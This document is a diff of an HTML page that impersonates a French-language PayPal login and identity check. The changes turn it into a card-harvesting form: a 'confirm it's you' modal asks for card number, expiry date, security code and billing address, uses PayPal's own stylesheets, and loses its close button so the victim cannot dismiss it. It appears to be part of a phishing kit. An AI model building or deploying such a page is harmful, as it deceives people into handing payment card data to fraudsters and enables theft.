@@ -1,15 +1,18 @@
-  <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/3b9/ff4ef87559b8ee59894bf2aecd489/css/main.ltr.css">
+  <html lang="fr" class=" mobile js ">
+ <head> 
+
+  <title>Connectez-vous à votre compte PayPal</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
+   <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/133/7f03f19f48baf5284350bafe40e00/css/contextualLoginElementalUI.css">
+<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/3b9/ff4ef87559b8ee59894bf2aecd489/css/main.ltr.css">
   <title>PayPal&nbsp;: Portefeuille</title> 
  </head>
   <div> 
-   <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/consumer-home/header-footer/1.57.4/header-footer-dw.min.css">
-   <style nonce="">@media print and (max-width: 768px) { .vx_globalNav-container { display: none; } }</style>
-  </div>
   <input type="checkbox" id="toggleNavigation" class="vx_globalNav-toggleCheckbox" aria-label="Activer ou désactiver la navigation" style="display: none;">
   <div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" role="dialog" aria-modal="true" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection vx_modal-wrapper_logo" tabindex="-1">
     <div>
-     <a data-name="modalClose" id="modalClose" tabindex="0" class="vx_modal-dismiss_x-trigger test_dismissFlow" pa-marked="1"><span class="vx_a11yText">fermer</span></a>
      <div class="vx_modal-content">
       <header class="vx_modal-header">
        <h2 id="js_modalHeader" class="vx_text-2 header-centered">Confirmez qu'il s'agit bien de vous</h2>
@@ -25,24 +28,26 @@
              <img width="150" class="cardImage_medium" src="https://www.paypalobjects.com/ui-web/money-icons/card/generic_card.png" alt="">
             </div>
            </div>
-           <div class="textinputgroup" data-label-content="Numéro de carte bancaire">
-            <label id="text-info-cardNumber" class="floatingLabel" for="cardNumber"><b>Numéro de carte bancaire</b></label>
-            <input maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="text" id="cardNumber" name="cardNumber" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Saisissez le numéro de carte" autocomplete="off" value="">
            </div>
+           <div class="textinputgroup">
+              <div class="textinputgroup" data-label-content="Cryptogramme visuel">
+               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b></b></label>
+               <input type="number"maxlength="19" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="password"  class="test_verificationCode test_verificationCode vx_form-control" placeholder="Numéro de carte bancaire" autocomplete="cc-csc" value="" required>
+              </div>
            <div id="dropdown_layout">
             <div class="ppvx_dropdown   ">
              <select id="brand" class="ppvx_dropdown__control test_brand " aria-describedby="brand" name="brand"><option value="-1">Sélectionnez votre type de carte</option><option value="visa">Visa</option><option value="master_card">Mastercard</option><option value="amex">American Express</option><option value="discover">Discover</option></select>
              <label class="ppvx_dropdown__label" for="brand">Type de carte</label>
             </div>
-           </div>
-           <div class="textinputgroup" data-label-content="Date d'expiration">
-            <label id="text-info-expDate" class="floatingLabel" for="expDate"><b>Date d'expiration</b></label>
-            <input type="text" id="expDate" name="expDate" class="test_expDate vx_form-control" placeholder="mm/aa" autocomplete="off" value=""requiered>
-           </div>
+           <div class="textinputgroup">
+              <div class="textinputgroup" data-label-content="Cryptogramme visuel">
+               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b></b></label>
+               <input type="number"maxlength="9" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="password"  class="test_verificationCode test_verificationCode vx_form-control" placeholder="Date d'expiration" autocomplete="cc-csc" value="" required>
+              </div>
            <div class="table-container">      
              <div class="table-col-xs-10">
               <div class="textinputgroup" data-label-content="Cryptogramme visuel">
-               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b>Cryptogramme visuel</b></label>
+               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b>ㅤㅤㅤㅤㅤㅤㅤㅤ</b></label>
                <input maxlength="4" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="password"  class="test_verificationCode test_verificationCode vx_form-control" placeholder="Saisissez le cryptogramme visuel" autocomplete="cc-csc" value="" required>
               </div>
              </div>
@@ -52,8 +57,9 @@
             </div>
            </div>
            <div class="textinputgroup" data-label-content="Numéro de carte bancaire">
+    <p></p>
             <input type="text" id="cardNumber" name="cardNumber" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Adresse de facturation" autocomplete="off" value="">
            </div>
            <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit " title="" pa-marked="1">Confirmer</button>
           </form>
-          
+          </html>          
